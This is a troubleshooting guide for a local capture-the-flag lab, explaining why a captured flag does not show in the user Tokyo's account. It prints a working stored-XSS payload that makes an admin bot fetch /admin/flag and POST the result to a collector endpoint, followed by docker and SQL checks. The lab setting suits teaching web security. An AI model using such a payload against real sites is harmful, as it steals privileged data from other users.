# Debug: Flag Not Appearing in Tokyo's Account

## The Problem

Your logs show:
- ✅ Flag is being fetched: `GET /admin/flag`
- ✅ Flag content received: `FLAG{THE_BOT_DID_THE_DIRTY_WORK}`
- ✅ Collector request made: `POST /collector`
- ❌ Flag NOT appearing in Tokyo's `/my-captures` page

## Possible Causes

### 1. Wrong `user_id` in Payload

The payload must use `user_id: 1` for Tokyo. Check your payload:

```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: flag })  // ← Must be 1 for Tokyo
    });
  });
</script>
```

### 2. Check What `user_id` Was Actually Sent

Check the web server logs to see what `user_id` the collector received:

```bash
sudo docker-compose logs web --tail 100 | grep collector
```

Look for:
```
[collector] Received request: user_id=X, data preview=FLAG{...
```

- If `X` is NOT 1, that's the problem!
- If `X` is 1, continue debugging...

### 3. Check Database Directly

Check if the flag is actually stored in the database:

```bash
sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT user_id, data, captured_at FROM captures ORDER BY id DESC LIMIT 5;"
```

This will show:
- What `user_id` the flag is stored under
- The actual flag content
- When it was captured

**If you see `user_id=1` with the flag:**
- The flag IS stored correctly
- The issue is with the `/my-captures` page display
- Try refreshing the page or logging out/in

**If you see `user_id=2` or different:**
- Your payload used the wrong `user_id`
- Fix the payload to use `user_id: 1`

**If you don't see the flag at all:**
- Check collector logs for errors
- The flag might not have been sent correctly

### 4. Verify Tokyo's Actual `user_id`

Check what Tokyo's actual `user_id` is in the database:

```bash
sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT id, username, role FROM users ORDER BY id;"
```

This shows:
- `id=1` should be `tokyo`
- `id=2` should be `admin`

If Tokyo is NOT `id=1`, update your payload to use the correct `user_id`.

### 5. Check if Flag Was Already Captured

The system prevents duplicate flags. Check if it was already captured:

```bash
sudo docker-compose logs web --tail 100 | grep "Flag already captured"
```

If you see this message, the flag is already in your account - just refresh `/my-captures`.

## Step-by-Step Debugging

1. **Check collector logs:**
   ```bash
   sudo docker-compose logs web --tail 100 | grep collector
   ```
   Note the `user_id` that was received.

2. **Check database:**
   ```bash
   sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT user_id, LEFT(data, 50) as flag_preview FROM captures ORDER BY id DESC LIMIT 3;"
   ```
   Verify the flag is stored and what `user_id` it's under.

3. **Verify Tokyo's user_id:**
   ```bash
   sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT id, username FROM users WHERE username='tokyo';"
   ```
   Confirm Tokyo's `id` is 1.

4. **If user_id matches but flag doesn't appear:**
   - Logout and login again as Tokyo
   - Clear browser cache
   - Check `/my-captures` URL is correct
   - Try accessing directly: `http://localhost:5002/my-captures`

## Quick Fix

If the flag is stored under the wrong `user_id`, you can either:

1. **Fix the payload** to use the correct `user_id`
2. **Reset the challenge** and try again:
   ```bash
   # Reset via admin endpoint (if you have admin access)
   curl -X POST http://localhost:5002/admin/reset
   
   # Or restart containers
   sudo docker-compose restart
   ```

## Expected Database State

After successful flag capture, you should see:

```sql
SELECT user_id, data FROM captures;
```

Result:
```
 user_id | data
---------+----------------------------------
       1 | FLAG{THE_BOT_DID_THE_DIRTY_WORK}
```

If `user_id` is different, that's your problem!

